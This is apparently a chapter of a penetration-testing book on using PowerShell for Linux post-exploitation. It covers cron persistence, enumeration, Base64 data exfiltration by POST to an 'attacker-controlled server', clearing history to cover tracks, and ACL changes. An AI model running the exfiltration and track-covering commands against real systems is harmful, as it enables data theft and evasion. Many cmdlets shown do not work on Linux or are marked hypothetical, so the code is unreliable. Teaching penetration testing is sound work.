<html><head></head><body>
<div id="_idContainer064">
<h1 class="chapter-number" id="_idParaDest-513"><a id="_idTextAnchor511"/><span class="koboSpan" id="kobo.1.1">16</span></h1>
<h1 id="_idParaDest-514"><a id="_idTextAnchor512"/><span class="koboSpan" id="kobo.2.1">Post-Exploitation in Linux</span></h1>
<p><span class="koboSpan" id="kobo.3.1">In this chapter, we will explore the potent synergy between PowerShell and Linux in the realm of post-exploitation. </span><span class="koboSpan" id="kobo.3.2">In a landscape traditionally dominated by native Linux tools, PowerShell’s cross-platform adaptability emerges as a game-changer, providing security professionals with a versatile toolkit for post-exploitation maneuvers. </span><span class="koboSpan" id="kobo.3.3">This chapter delves into the strategic utilization of PowerShell to navigate and manipulate Linux </span><span class="No-Break"><span class="koboSpan" id="kobo.4.1">environments post-breach.</span></span></p>
<p><span class="koboSpan" id="kobo.5.1">As we embark on this journey, we’ll uncover PowerShell’s role in privilege escalation, lateral movement, and data exfiltration within Linux systems. </span><span class="koboSpan" id="kobo.5.2">From profiling users and manipulating file permissions to exploiting vulnerabilities, each facet of post-exploitation is dissected through detailed worked examples, demonstrating PowerShell’s effectiveness in simulating </span><span class="No-Break"><span class="koboSpan" id="kobo.6.1">real-world threats.</span></span></p>
<p><span class="koboSpan" id="kobo.7.1">Whether you are an ethical hacker seeking to understand and simulate potential risks or a defender looking to fortify your Linux environment, this chapter equips you with actionable insights. </span><span class="koboSpan" id="kobo.7.2">Join us in unraveling the dynamic interplay between PowerShell and Linux in the post-exploitation phase as we navigate the complexities of security landscapes, empowering you to strategically assess, defend, and respond to the challenges posed by </span><span class="No-Break"><span class="koboSpan" id="kobo.8.1">post-exploitation scenarios.</span></span></p>
<p><span class="koboSpan" id="kobo.9.1">The following are the topics to be covered in </span><span class="No-Break"><span class="koboSpan" id="kobo.10.1">this chapter:</span></span></p>
<ul>
<li><span class="koboSpan" id="kobo.11.1">The role of post-exploitation in Linux on a </span><span class="No-Break"><span class="koboSpan" id="kobo.12.1">penetration test</span></span></li>
<li><span class="koboSpan" id="kobo.13.1">Post-exploitation </span><span class="No-Break"><span class="koboSpan" id="kobo.14.1">on Linux</span></span></li>
<li><span class="koboSpan" id="kobo.15.1">Profiling a user with PowerShell </span><span class="No-Break"><span class="koboSpan" id="kobo.16.1">in Linux</span></span></li>
<li><span class="koboSpan" id="kobo.17.1">File permissions </span><span class="No-Break"><span class="koboSpan" id="kobo.18.1">in Linux</span></span></li>
<li><span class="koboSpan" id="kobo.19.1">Using PowerShell for privilege escalation </span><span class="No-Break"><span class="koboSpan" id="kobo.20.1">in Linux</span></span></li>
</ul>
<h1 id="_idParaDest-515"><a id="_idTextAnchor513"/><span class="koboSpan" id="kobo.21.1">The role of post-exploitation in Linux on a penetration test</span></h1>
<p><span class="koboSpan" id="kobo.22.1">Post-exploitation is a crucial phase in a penetration test on Linux systems, where security </span><a id="_idIndexMarker996"/><span class="koboSpan" id="kobo.23.1">professionals assess the extent of access gained and exploit opportunities to establish persistence, escalate privileges, and gather valuable information. </span><span class="koboSpan" id="kobo.23.2">This phase occurs after an initial breach, allowing testers to simulate real-world </span><span class="No-Break"><span class="koboSpan" id="kobo.24.1">attack scenarios.</span></span></p>
<p><span class="koboSpan" id="kobo.25.1">One primary </span><a id="_idIndexMarker997"/><span class="koboSpan" id="kobo.26.1">objective of post-exploitation in Linux is to achieve and maintain persistence. </span><span class="koboSpan" id="kobo.26.2">Attackers seek to establish a lasting presence on the compromised system, ensuring continued access even after initial detection and remediation attempts. </span><span class="koboSpan" id="kobo.26.3">This can involve creating backdoors, modifying startup scripts, or installing </span><span class="No-Break"><span class="koboSpan" id="kobo.27.1">malicious services.</span></span></p>
<p><span class="koboSpan" id="kobo.28.1">Privilege escalation is another key focus during post-exploitation. </span><span class="koboSpan" id="kobo.28.2">Linux systems operate with various user accounts, each assigned specific privileges. </span><span class="koboSpan" id="kobo.28.3">Testers aim to escalate their privileges to gain access to sensitive data, manipulate configurations, or execute critical system commands. </span><span class="koboSpan" id="kobo.28.4">Techniques may include exploiting vulnerabilities or misconfigurations or leveraging weakly </span><span class="No-Break"><span class="koboSpan" id="kobo.29.1">protected services.</span></span></p>
<p><span class="koboSpan" id="kobo.30.1">Information gathering plays a pivotal role in post-exploitation. </span><span class="koboSpan" id="kobo.30.2">Testers aim to collect valuable data about the compromised system, such as user accounts, network configurations, and running processes. </span><span class="koboSpan" id="kobo.30.3">Tools such as </span><strong class="source-inline"><span class="koboSpan" id="kobo.31.1">ps</span></strong><span class="koboSpan" id="kobo.32.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.33.1">netstat</span></strong><span class="koboSpan" id="kobo.34.1">, and custom scripts are often employed to extract this information, aiding in the reconnaissance of the </span><span class="No-Break"><span class="koboSpan" id="kobo.35.1">targeted environment.</span></span></p>
<p><span class="koboSpan" id="kobo.36.1">Linux post-exploitation involves lateral movement within the network. </span><span class="koboSpan" id="kobo.36.2">Once inside a system, testers seek to traverse through interconnected systems to explore the broader network. </span><span class="koboSpan" id="kobo.36.3">Techniques such as SSH tunneling, port forwarding, and pivoting are employed to move laterally and identify additional targets </span><span class="No-Break"><span class="koboSpan" id="kobo.37.1">for exploitation.</span></span></p>
<p><span class="koboSpan" id="kobo.38.1">Data exfiltration is a critical concern during post-exploitation. </span><span class="koboSpan" id="kobo.38.2">Testers simulate the extraction of sensitive information, such as user credentials or confidential files, to assess the effectiveness of security controls. </span><span class="koboSpan" id="kobo.38.3">Tools such as </span><strong class="source-inline"><span class="koboSpan" id="kobo.39.1">scp</span></strong><span class="koboSpan" id="kobo.40.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.41.1">rsync</span></strong><span class="koboSpan" id="kobo.42.1">, or custom scripts may transfer data to external servers controlled by </span><span class="No-Break"><span class="koboSpan" id="kobo.43.1">the tester.</span></span></p>
<p><span class="koboSpan" id="kobo.44.1">Covering tracks is an essential aspect of post-exploitation in Linux. </span><span class="koboSpan" id="kobo.44.2">Testers aim to erase or manipulate logs and other traces of their activities to avoid detection. </span><span class="koboSpan" id="kobo.44.3">This involves modifying log files, clearing command histories, and disabling or evading </span><span class="No-Break"><span class="koboSpan" id="kobo.45.1">auditing mechanisms.</span></span></p>
<p><span class="koboSpan" id="kobo.46.1">Post-exploitation in Linux is often conducted using manual techniques and automated tools. </span><span class="koboSpan" id="kobo.46.2">Common </span><a id="_idIndexMarker998"/><span class="koboSpan" id="kobo.47.1">tools include Metasploit, Empire, and various scripting languages such as Python or Bash. </span><span class="koboSpan" id="kobo.47.2">Security professionals </span><a id="_idIndexMarker999"/><span class="koboSpan" id="kobo.48.1">need to understand Linux system internals, file structures, and security mechanisms to navigate and manipulate the environment during </span><span class="No-Break"><span class="koboSpan" id="kobo.49.1">post-exploitation effectively.</span></span></p>
<p><span class="koboSpan" id="kobo.50.1">In summary, post-exploitation in Linux on a penetration test involves establishing persistence, escalating privileges, gathering information, lateral movement, data exfiltration, and covering tracks. </span><span class="koboSpan" id="kobo.50.2">Security professionals employ various techniques and tools to simulate real-world attacks, helping organizations identify and address vulnerabilities in their </span><span class="No-Break"><span class="koboSpan" id="kobo.51.1">Linux-based systems.</span></span></p>
<h1 id="_idParaDest-516"><a id="_idTextAnchor514"/><span class="koboSpan" id="kobo.52.1">Post-exploitation on Linux</span></h1>
<p><span class="koboSpan" id="kobo.53.1">PowerShell is </span><a id="_idIndexMarker1000"/><span class="koboSpan" id="kobo.54.1">primarily associated with Windows environments, and its functionality on Linux is limited. </span><span class="koboSpan" id="kobo.54.2">However, with the introduction of PowerShell Core (now known as PowerShell 7), a cross-platform version of PowerShell, it has become possible to use PowerShell for post-exploitation on Linux. </span><span class="koboSpan" id="kobo.54.3">Although PowerShell on Linux doesn’t have the same extensive functionality as Windows, it can still be utilized for specific tasks </span><span class="No-Break"><span class="koboSpan" id="kobo.55.1">during post-exploitation.</span></span></p>
<h2 id="_idParaDest-517"><a id="_idTextAnchor515"/><span class="koboSpan" id="kobo.56.1">Establishing persistence</span></h2>
<p><span class="koboSpan" id="kobo.57.1">On Linux, persistence can </span><a id="_idIndexMarker1001"/><span class="koboSpan" id="kobo.58.1">be achieved by setting up a cron job to execute a PowerShell script at regular intervals. </span><span class="koboSpan" id="kobo.58.2">Here’s an example of a basic </span><span class="No-Break"><span class="koboSpan" id="kobo.59.1">cron job:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.60.1">
# Edit crontab
crontab -e
# Add the following line to run a PowerShell script every minute
* * * * * /usr/bin/pwsh /path/to/persistence.ps1</span></pre> <p><span class="koboSpan" id="kobo.61.1">The </span><strong class="source-inline"><span class="koboSpan" id="kobo.62.1">persistence.ps1</span></strong><span class="koboSpan" id="kobo.63.1"> PowerShell script can contain code for maintaining access or setting </span><span class="No-Break"><span class="koboSpan" id="kobo.64.1">up backdoors.</span></span></p>
<h2 id="_idParaDest-518"><a id="_idTextAnchor516"/><span class="koboSpan" id="kobo.65.1">Privilege escalation</span></h2>
<p><span class="koboSpan" id="kobo.66.1">PowerShell on Linux can be used to check for potential privilege escalation opportunities. </span><span class="koboSpan" id="kobo.66.2">One </span><a id="_idIndexMarker1002"/><span class="koboSpan" id="kobo.67.1">common method is to identify processes running with elevated privileges. </span><span class="koboSpan" id="kobo.67.2">Here’s an </span><span class="No-Break"><span class="koboSpan" id="kobo.68.1">example script:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.69.1">
# Check for processes running with elevated privileges
Get-Process | Where-Object { $_.Elevated -eq $true } | Select-Object ProcessName, UserName</span></pre> <p><span class="koboSpan" id="kobo.70.1">This script lists processes running with elevated privileges, helping identify potential targets for </span><span class="No-Break"><span class="koboSpan" id="kobo.71.1">privilege escalation.</span></span></p>
<h2 id="_idParaDest-519"><a id="_idTextAnchor517"/><span class="koboSpan" id="kobo.72.1">Enumerating users and groups</span></h2>
<p><span class="koboSpan" id="kobo.73.1">PowerShell </span><a id="_idIndexMarker1003"/><span class="koboSpan" id="kobo.74.1">on Linux can be used to gather information about users and groups. </span><span class="koboSpan" id="kobo.74.2">An example is listing all users and their </span><span class="No-Break"><span class="koboSpan" id="kobo.75.1">group memberships:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.76.1">
# List all users and their groups
Get-LocalUser | ForEach-Object {
    $user = $_
    $groups = Get-LocalGroup -Member $user.Name | Select-Object -ExpandProperty Name
    "$($user.Name) : $($groups -join ', ')"
}</span></pre> <p><span class="koboSpan" id="kobo.77.1">This script retrieves information about local users and their </span><span class="No-Break"><span class="koboSpan" id="kobo.78.1">group memberships.</span></span></p>
<h2 id="_idParaDest-520"><a id="_idTextAnchor518"/><span class="koboSpan" id="kobo.79.1">Network enumeration</span></h2>
<p><span class="koboSpan" id="kobo.80.1">PowerShell </span><a id="_idIndexMarker1004"/><span class="koboSpan" id="kobo.81.1">on Linux can help enumerate network information. </span><span class="koboSpan" id="kobo.81.2">An example is listing network interfaces and </span><span class="No-Break"><span class="koboSpan" id="kobo.82.1">their configurations:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.83.1">
# List network interfaces and configurations
Get-NetIPAddress | Select-Object InterfaceAlias, IPAddress, PrefixLength</span></pre> <p><span class="koboSpan" id="kobo.84.1">This script </span><a id="_idIndexMarker1005"/><span class="koboSpan" id="kobo.85.1">provides information about network interfaces, IP addresses, and prefix lengths. </span><span class="koboSpan" id="kobo.85.2">We can also use the following to capture IP </span><span class="No-Break"><span class="koboSpan" id="kobo.86.1">address information:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.87.1">
# List network interfaces and configurations
Invoke-Expression -Command "ip addr show"</span></pre> <h2 id="_idParaDest-521"><a id="_idTextAnchor519"/><span class="koboSpan" id="kobo.88.1">File and directory enumeration</span></h2>
<p><span class="koboSpan" id="kobo.89.1">PowerShell </span><a id="_idIndexMarker1006"/><span class="koboSpan" id="kobo.90.1">can gather information about files and directories on the Linux system. </span><span class="koboSpan" id="kobo.90.2">An example is listing files in the </span><strong class="source-inline"><span class="koboSpan" id="kobo.91.1">/</span></strong><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.92.1">etc</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.93.1"> directory:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.94.1">
# List files in the /etc directory
Get-ChildItem -Path /etc</span></pre> <p><span class="koboSpan" id="kobo.95.1">This script enumerates files and directories within the </span><span class="No-Break"><span class="koboSpan" id="kobo.96.1">specified path.</span></span></p>
<h2 id="_idParaDest-522"><a id="_idTextAnchor520"/><span class="koboSpan" id="kobo.97.1">Data exfiltration</span></h2>
<p><span class="koboSpan" id="kobo.98.1">PowerShell </span><a id="_idIndexMarker1007"/><span class="koboSpan" id="kobo.99.1">on Linux can be used to exfiltrate data. </span><span class="koboSpan" id="kobo.99.2">An example is encoding a file in Base64 and sending it to an </span><span class="No-Break"><span class="koboSpan" id="kobo.100.1">external server:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.101.1">
# Encode and exfiltrate a file
$fileContent = Get-Content /path/to/sensitive-file.txt -Raw
$encodedContent = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileContent))
Invoke-RestMethod -Uri "http s://snowcap cyber.com/upload" -Method POST -Body $encodedContent</span></pre> <p><span class="koboSpan" id="kobo.102.1">This script encodes the content of a file in Base64 and sends it to an </span><span class="No-Break"><span class="koboSpan" id="kobo.103.1">attacker-controlled server.</span></span></p>
<h2 id="_idParaDest-523"><a id="_idTextAnchor521"/><span class="koboSpan" id="kobo.104.1">Covering tracks</span></h2>
<p><span class="koboSpan" id="kobo.105.1">PowerShell on </span><a id="_idIndexMarker1008"/><span class="koboSpan" id="kobo.106.1">Linux can cover tracks by modifying or deleting logs. </span><span class="koboSpan" id="kobo.106.2">An example is clearing </span><span class="No-Break"><span class="koboSpan" id="kobo.107.1">Bash history:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.108.1">
# Clear Bash history
Clear-History</span></pre> <p><span class="koboSpan" id="kobo.109.1">This script removes the command history, helping to cover tracks by erasing executed </span><span class="No-Break"><span class="koboSpan" id="kobo.110.1">command records.</span></span></p>
<p><span class="koboSpan" id="kobo.111.1">It’s important to note that using PowerShell on Linux for post-exploitation may not be as familiar or powerful as on Windows. </span><span class="koboSpan" id="kobo.111.2">Linux systems typically have native tools and scripting languages such as Bash that are more prevalent and well integrated. </span><span class="koboSpan" id="kobo.111.3">While PowerShell on Linux can be used in specific scenarios, understanding and utilizing Linux-specific tools is often more effective. </span><span class="koboSpan" id="kobo.111.4">Security professionals should know the context and environment when choosing post-exploitation techniques </span><span class="No-Break"><span class="koboSpan" id="kobo.112.1">on Linux.</span></span></p>
<h1 id="_idParaDest-524"><a id="_idTextAnchor522"/><span class="koboSpan" id="kobo.113.1">Profiling a user with PowerShell in Linux</span></h1>
<p><span class="koboSpan" id="kobo.114.1">Profiling a user with PowerShell on Linux involves gathering detailed information about the </span><a id="_idIndexMarker1009"/><span class="koboSpan" id="kobo.115.1">user’s activities, permissions, and system </span><a id="_idIndexMarker1010"/><span class="koboSpan" id="kobo.116.1">interactions. </span><span class="koboSpan" id="kobo.116.2">While Linux offers native tools </span><a id="_idIndexMarker1011"/><span class="koboSpan" id="kobo.117.1">and commands for system profiling, PowerShell can complement these by providing a consistent and scriptable interface across </span><span class="No-Break"><span class="koboSpan" id="kobo.118.1">different platforms.</span></span></p>
<h2 id="_idParaDest-525"><a id="_idTextAnchor523"/><span class="koboSpan" id="kobo.119.1">User information</span></h2>
<p><span class="koboSpan" id="kobo.120.1">PowerShell </span><a id="_idIndexMarker1012"/><span class="koboSpan" id="kobo.121.1">on Linux can retrieve information about a specific user, including username, UID, GID, home directory, and shell. </span><span class="koboSpan" id="kobo.121.2">Here’s </span><span class="No-Break"><span class="koboSpan" id="kobo.122.1">an example:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.123.1">
# Get information about a specific user
Get-User -Name andrewblyth</span></pre> <p><span class="koboSpan" id="kobo.124.1">This hypothetical cmdlet </span><strong class="source-inline"><span class="koboSpan" id="kobo.125.1">Get-User</span></strong><span class="koboSpan" id="kobo.126.1"> retrieves user information for the user </span><span class="No-Break"><span class="koboSpan" id="kobo.127.1">named </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.128.1">andrewblyth</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.129.1">.</span></span></p>
<h2 id="_idParaDest-526"><a id="_idTextAnchor524"/><span class="koboSpan" id="kobo.130.1">Running processes</span></h2>
<p><span class="koboSpan" id="kobo.131.1">PowerShell </span><a id="_idIndexMarker1013"/><span class="koboSpan" id="kobo.132.1">can list running processes and filter them based on the user. </span><span class="koboSpan" id="kobo.132.2">This allows for a quick overview of the processes associated with a </span><span class="No-Break"><span class="koboSpan" id="kobo.133.1">specific user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.134.1">
# Get processes for a specific user
Get-Process | Where-Object { $_.UserName -eq "andrewblyth" }</span></pre> <p><span class="koboSpan" id="kobo.135.1">This script lists the processes running for the </span><span class="No-Break"><span class="koboSpan" id="kobo.136.1">user </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.137.1">andrewblyth</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.138.1">.</span></span></p>
<h2 id="_idParaDest-527"><a id="_idTextAnchor525"/><span class="koboSpan" id="kobo.139.1">Network connections</span></h2>
<p><span class="koboSpan" id="kobo.140.1">PowerShell </span><a id="_idIndexMarker1014"/><span class="koboSpan" id="kobo.141.1">on Linux can provide insights into network connections associated with a user. </span><span class="koboSpan" id="kobo.141.2">An example is listing network connections for a </span><span class="No-Break"><span class="koboSpan" id="kobo.142.1">specific user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.143.1">
# Get network connections for a specific user
Get-NetTCPConnection -OwningUser "andrewblyth"</span></pre> <p><span class="koboSpan" id="kobo.144.1">This command displays information about TCP connections owned by the </span><span class="No-Break"><span class="koboSpan" id="kobo.145.1">user </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.146.1">andrewblyth</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.147.1">.</span></span></p>
<h2 id="_idParaDest-528"><a id="_idTextAnchor526"/><span class="koboSpan" id="kobo.148.1">File and directory access</span></h2>
<p><span class="koboSpan" id="kobo.149.1">Profiling </span><a id="_idIndexMarker1015"/><span class="koboSpan" id="kobo.150.1">involves understanding a user’s file and directory access. </span><span class="koboSpan" id="kobo.150.2">PowerShell can be used to list files and directories a user has </span><span class="No-Break"><span class="koboSpan" id="kobo.151.1">access to:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.152.1">
# List files and directories for a specific user
Get-ChildItem -Path /home/andrewblyth</span></pre> <p><span class="koboSpan" id="kobo.153.1">This script provides a list of files and directories in the user’s home </span><span class="No-Break"><span class="koboSpan" id="kobo.154.1">directory, </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.155.1">andrewblyth</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.156.1">.</span></span></p>
<h2 id="_idParaDest-529"><a id="_idTextAnchor527"/><span class="koboSpan" id="kobo.157.1">Installed software</span></h2>
<p><span class="koboSpan" id="kobo.158.1">PowerShell </span><a id="_idIndexMarker1016"/><span class="koboSpan" id="kobo.159.1">can query installed software on Linux systems, allowing profiling of a user’s software environment. </span><span class="koboSpan" id="kobo.159.2">Here’s an example using a hypothetical </span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.160.1">Get-InstalledSoftware</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.161.1"> cmdlet:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.162.1">
# Get installed software for a specific user
Get-InstalledSoftware -User "andrewblyth"</span></pre> <p><span class="koboSpan" id="kobo.163.1">This cmdlet would retrieve a list of software installed for the </span><span class="No-Break"><span class="koboSpan" id="kobo.164.1">user </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.165.1">andrewblyth</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.166.1">.</span></span></p>
<h2 id="_idParaDest-530"><a id="_idTextAnchor528"/><span class="koboSpan" id="kobo.167.1">Recent activities</span></h2>
<p><span class="koboSpan" id="kobo.168.1">PowerShell </span><a id="_idIndexMarker1017"/><span class="koboSpan" id="kobo.169.1">on Linux can query system logs to gather information about a user’s recent activities. </span><span class="koboSpan" id="kobo.169.2">An example is retrieving recent login events for </span><span class="No-Break"><span class="koboSpan" id="kobo.170.1">a user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.171.1">
# Get recent login events for a specific user
Get-WinEvent -LogName auth.log -FilterXPath "*[System[(EventID=1) and EventData[Data[@Name='user']='$andrewblyth]]]" -MaxEvents 10</span></pre> <p><span class="koboSpan" id="kobo.172.1">This example retrieves the last 10 authentication events for the user </span><strong class="source-inline"><span class="koboSpan" id="kobo.173.1">andrewblyth</span></strong><span class="koboSpan" id="kobo.174.1"> from the </span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.175.1">auth.log</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.176.1"> file.</span></span></p>
<h2 id="_idParaDest-531"><a id="_idTextAnchor529"/><span class="koboSpan" id="kobo.177.1">Data exfiltration</span></h2>
<p><span class="koboSpan" id="kobo.178.1">PowerShell </span><a id="_idIndexMarker1018"/><span class="koboSpan" id="kobo.179.1">can be employed for data exfiltration on Linux using various techniques. </span><span class="koboSpan" id="kobo.179.2">One common method is to encode data into Base64 and send it over the network. </span><span class="koboSpan" id="kobo.179.3">Here’s a </span><span class="No-Break"><span class="koboSpan" id="kobo.180.1">hypothetical example:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.181.1">
# Encode and send data to a remote server
$data = "SensitiveData"
$encodedData = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
Invoke-WebRequest -Uri "https://snpowcapcyber.com.com/upload.php" -Method POST -Body $encodedData</span></pre> <p><span class="koboSpan" id="kobo.182.1">This script encodes the string </span><strong class="source-inline"><span class="koboSpan" id="kobo.183.1">SensitiveData</span></strong><span class="koboSpan" id="kobo.184.1"> into Base64 and sends it to an </span><span class="No-Break"><span class="koboSpan" id="kobo.185.1">attacker-controlled server.</span></span></p>
<p><span class="koboSpan" id="kobo.186.1">While the examples provided demonstrate the potential use of PowerShell for profiling a user on Linux, it’s important to note that Linux has a rich ecosystem of native tools and commands </span><a id="_idIndexMarker1019"/><span class="koboSpan" id="kobo.187.1">that are more commonly used for these tasks. </span><span class="koboSpan" id="kobo.187.2">Commands such as </span><strong class="source-inline"><span class="koboSpan" id="kobo.188.1">ps</span></strong><span class="koboSpan" id="kobo.189.1">, </span><strong class="source-inline"><span class="koboSpan" id="kobo.190.1">ls</span></strong><span class="koboSpan" id="kobo.191.1">, and </span><strong class="source-inline"><span class="koboSpan" id="kobo.192.1">netstat</span></strong><span class="koboSpan" id="kobo.193.1"> and logs in </span><strong class="source-inline"><span class="koboSpan" id="kobo.194.1">/var/log</span></strong><span class="koboSpan" id="kobo.195.1"> often provide the necessary information without needing PowerShell. </span><span class="koboSpan" id="kobo.195.2">However, in heterogeneous environments where PowerShell is utilized for other tasks, its cross-platform nature can offer consistency in scripting and automation across different operating systems. </span><span class="koboSpan" id="kobo.195.3">Profiling a user on Linux with PowerShell should be approached considering the specific requirements and context of the environment in which it is </span><span class="No-Break"><span class="koboSpan" id="kobo.196.1">being used.</span></span></p>
<h1 id="_idParaDest-532"><a id="_idTextAnchor530"/><span class="koboSpan" id="kobo.197.1">File permissions in Linux</span></h1>
<p><span class="koboSpan" id="kobo.198.1">PowerShell, traditionally known as a scripting language for Windows environments, has expanded its </span><a id="_idIndexMarker1020"/><span class="koboSpan" id="kobo.199.1">capabilities to Linux systems by introducing PowerShell Core (PowerShell 7). </span><span class="koboSpan" id="kobo.199.2">While Linux primarily relies on native tools and commands for file and directory permissions, PowerShell can offer a consistent scripting interface across different platforms. </span><span class="koboSpan" id="kobo.199.3">Here, we’ll explore how PowerShell on Linux can interact with </span><span class="No-Break"><span class="koboSpan" id="kobo.200.1">file permissions.</span></span></p>
<h2 id="_idParaDest-533"><a id="_idTextAnchor531"/><span class="koboSpan" id="kobo.201.1">Viewing file permissions</span></h2>
<p><span class="koboSpan" id="kobo.202.1">PowerShell on </span><a id="_idIndexMarker1021"/><span class="koboSpan" id="kobo.203.1">Linux allows users to view file permissions using the </span><strong class="source-inline"><span class="koboSpan" id="kobo.204.1">Get-Acl</span></strong><span class="koboSpan" id="kobo.205.1"> cmdlet. </span><span class="koboSpan" id="kobo.205.2">Take the </span><span class="No-Break"><span class="koboSpan" id="kobo.206.1">following example:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.207.1">
# Get file permissions for a specific file
Get-Acl /path/to/file.txt</span></pre> <p><span class="koboSpan" id="kobo.208.1">This command </span><a id="_idIndexMarker1022"/><span class="koboSpan" id="kobo.209.1">retrieves the </span><strong class="bold"><span class="koboSpan" id="kobo.210.1">Access Control List</span></strong><span class="koboSpan" id="kobo.211.1"> (</span><strong class="bold"><span class="koboSpan" id="kobo.212.1">ACL</span></strong><span class="koboSpan" id="kobo.213.1">) for the specified file, displaying details about ownership </span><span class="No-Break"><span class="koboSpan" id="kobo.214.1">and permissions.</span></span></p>
<h2 id="_idParaDest-534"><a id="_idTextAnchor532"/><span class="koboSpan" id="kobo.215.1">Granting file permissions</span></h2>
<p><span class="koboSpan" id="kobo.216.1">PowerShell </span><a id="_idIndexMarker1023"/><span class="koboSpan" id="kobo.217.1">can be used to grant specific permissions to a user or group. </span><span class="koboSpan" id="kobo.217.2">An example is granting read and write permissions to </span><span class="No-Break"><span class="koboSpan" id="kobo.218.1">a user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.219.1">
# Grant read and write permissions to a user
$filePath = "/path/to/file.txt"
$user = " andrewblyth "
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($user, "Read, Write", "Allow")
(Get-Acl $filePath).AddAccessRule($rule) | Set-Acl $filePath</span></pre> <p><span class="koboSpan" id="kobo.220.1">This script creates a new access rule granting the user </span><strong class="source-inline"><span class="koboSpan" id="kobo.221.1">andrewblyth</span></strong><span class="koboSpan" id="kobo.222.1"> read and write permissions on the </span><span class="No-Break"><span class="koboSpan" id="kobo.223.1">specified file.</span></span></p>
<h2 id="_idParaDest-535"><a id="_idTextAnchor533"/><span class="koboSpan" id="kobo.224.1">Modifying file permissions</span></h2>
<p><span class="koboSpan" id="kobo.225.1">PowerShell </span><a id="_idIndexMarker1024"/><span class="koboSpan" id="kobo.226.1">on Linux can be used to modify existing file permissions. </span><span class="koboSpan" id="kobo.226.2">An example is adding execute permissions to </span><span class="No-Break"><span class="koboSpan" id="kobo.227.1">a group:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.228.1">
# Add execute permissions to a group
$filePath = "/path/to/file.sh"
$group = "developers"
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule($group, "ExecuteFile", "Allow")
(Get-Acl $filePath).AddAccessRule($rule) | Set-Acl $filePath</span></pre> <p><span class="koboSpan" id="kobo.229.1">This script adds an access rule allowing the </span><strong class="source-inline"><span class="koboSpan" id="kobo.230.1">developers</span></strong><span class="koboSpan" id="kobo.231.1"> group to execute the specified </span><span class="No-Break"><span class="koboSpan" id="kobo.232.1">script file.</span></span></p>
<h2 id="_idParaDest-536"><a id="_idTextAnchor534"/><span class="koboSpan" id="kobo.233.1">Revoking file permissions</span></h2>
<p><span class="koboSpan" id="kobo.234.1">PowerShell </span><a id="_idIndexMarker1025"/><span class="koboSpan" id="kobo.235.1">can also be employed to revoke or remove file permissions. </span><span class="koboSpan" id="kobo.235.2">An example is removing write permissions from </span><span class="No-Break"><span class="koboSpan" id="kobo.236.1">a user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.237.1">
# Remove write permissions from a user
$filePath = "/path/to/data.txt"
$user = "alice"
$acl = Get-Acl $filePath
$rule = $acl.Access | Where-Object { $_.IdentityReference -eq $user -and $_.FileSystemRights -eq "Write" }
$acl.RemoveAccessRule($rule) | Set-Acl $filePath</span></pre> <p><span class="koboSpan" id="kobo.238.1">This script identifies and removes the write permission rule for the user </span><strong class="source-inline"><span class="koboSpan" id="kobo.239.1">alice</span></strong><span class="koboSpan" id="kobo.240.1"> on the </span><span class="No-Break"><span class="koboSpan" id="kobo.241.1">specified file.</span></span></p>
<h2 id="_idParaDest-537"><a id="_idTextAnchor535"/><span class="koboSpan" id="kobo.242.1">Changing ownership</span></h2>
<p><span class="koboSpan" id="kobo.243.1">PowerShell </span><a id="_idIndexMarker1026"/><span class="koboSpan" id="kobo.244.1">can facilitate changing the ownership of a file. </span><span class="koboSpan" id="kobo.244.2">An example is changing the owner of a file to a </span><span class="No-Break"><span class="koboSpan" id="kobo.245.1">different user:</span></span></p>
<pre class="source-code"><span class="koboSpan" id="kobo.246.1">
# Change file ownership to a different user
$filePath = "/path/to/file.txt"
$newOwner = "andrewblyth"
(Get-Acl $filePath).SetOwner([System.Security.Principal.NTAccount] $newOwner) | Set-Acl $filePath</span></pre> <p><span class="koboSpan" id="kobo.247.1">This script sets the owner of the specified file to the </span><span class="No-Break"><span class="koboSpan" id="kobo.248.1">user </span></span><span class="No-Break"><strong class="source-inline"><span class="koboSpan" id="kobo.249.1">andrewblyth</span></strong></span><span class="No-Break"><span class="koboSpan" id="kobo.250.1">.</span></span></p>
